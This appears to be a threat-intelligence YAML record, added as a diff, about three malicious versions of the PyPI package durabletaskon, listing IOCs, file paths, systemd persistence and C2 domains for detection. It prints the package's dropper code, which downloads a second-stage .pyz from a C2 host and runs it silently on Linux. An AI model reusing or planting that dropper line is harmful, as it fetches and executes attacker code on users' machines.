@@ -1,0 +1,52 @@
+title: Malicious durabletaskon PyPI Versions 1.4.1, 1.4.2, and 1.4.3
+description: Three malicious versions of the durabletaskon PyPI package contain a
+  dropper that fetches and executes a second-stage payload from a C2 domain.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes: []
+  command_lines: []
+  powershell: []
+  scripts:
+  - import osimport platformimport subprocessimport urllib.requestif platform.system()
+    == "Linux":try:urllib.request.urlretrieve("https://check.git-service[.]com/rope.pyz","/tmp/managed.pyz")with
+    open(os.devnull, "w") as f:subprocess.Popen(["python3", "/tmp/managed.pyz"],stdout=f,stderr=f,stdin=f,start_new_session=True)except
+    Exception:pass
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - python3 -> check.git-service[.]com:443
+  - python3 -> t.m-kosche[.]com:443
+  - python3 -> github.com:443
+  file_activity:
+  - /tmp/managed.pyz
+  - ~/.cache/.sys-update-check
+  - ~/.cache/.sys-update-check-k8s
+  - /usr/bin/pgmonitor.py
+  - ~/.local/bin/pgmonitor.py
+  - /etc/systemd/system/pgsql-monitor.service
+  - ~/.config/systemd/user/pgsql-monitor.service
+  - /tmp/kubectl
+  persistence:
+  - pgsql-monitor.service registered as a systemd service
+  process_relations: []
+iocs:
+  hashes:
+  - c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc
+  - 069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce
+  ip_addresses: []
+  domains:
+  - check.git-service[.]com
+  - t.m-kosche[.]com
+  - github.com
+  urls:
+  - hxxps://check.git-service[.]com/rope.pyz
+  - hxxps://check.git-service[.]com/v1/models
+  - hxxps://check.git-service[.]com/api/public/version
+  - hxxps://check.git-service[.]com/audio.mp3
+  - hxxps://t.m-kosche[.]com/rope.pyz
+authors: []
+reference: https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
+date_of_publication: May 19, 2026
+file_creation_date: May 19, 2026
